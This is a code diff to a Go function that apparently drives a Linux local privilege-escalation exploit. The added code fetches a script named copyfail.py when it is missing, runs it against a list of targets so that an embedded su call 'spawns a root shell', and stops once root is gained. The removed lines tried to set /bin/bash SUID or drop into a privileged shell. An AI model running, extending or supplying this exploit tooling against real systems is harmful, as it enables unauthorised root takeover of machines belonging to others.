@@ -48,8 +48,11 @@ func runCopyfailMatrix(s *systemInfo, stop *bool) {
 	}
 	src := absBin("copyfail.py")
 	if !hasFile(src) {
-		badf("copyfail.py not found at %s", src)
-		return
+		if !ensureFile("copyfail.py", false) {
+			badf("copyfail.py not found and fetch failed")
+			return
+		}
+		src = absBin("copyfail.py")
 	}
 	for _, t := range copyfailTargets() {
 		if *stop {
@@ -62,22 +65,14 @@ func runCopyfailMatrix(s *systemInfo, stop *bool) {
 			continue
 		}
 		infof("Trying %s (sed: %s)", name, t.sed)
-		r := runIsolated(name, "", []string{"python3", tmp}, 60*time.Second)
+		// Run copyfail.py via runInteractive so os.system("su") inside it
+		// gets /dev/tty stdin and spawns a root shell.
+		r := runInteractive(name, []string{"python3", tmp}, 60*time.Second)
 		r.report()
-		// Follow-up: actually invoke the patched target so it (hopefully)
-		// spawns a privileged shell or sets /bin/bash SUID.
-		// Use runInteractive so the patched binary gets /dev/tty stdin
-		// (not /dev/null) and can drop into an interactive root shell.
-		if t.run != "" {
-			r2 := runInteractive(name+"#followup", strings.Fields(t.run), 30*time.Second)
-			r2.report()
-			if r2.rootAfter || r2.suidAfter {
-				if !*flagNoSpawn {
-					shellSpawned.Store(rootspawn(&r2))
-				}
-				*stop = true
-				return
-			}
+		if r.exitCode == 0 && !r.crashed {
+			okf("%s succeeded — root shell was interactive", name)
+			*stop = true
+			return
 		}
 		if r.rootAfter || r.suidAfter {
 			if !*flagNoSpawn {
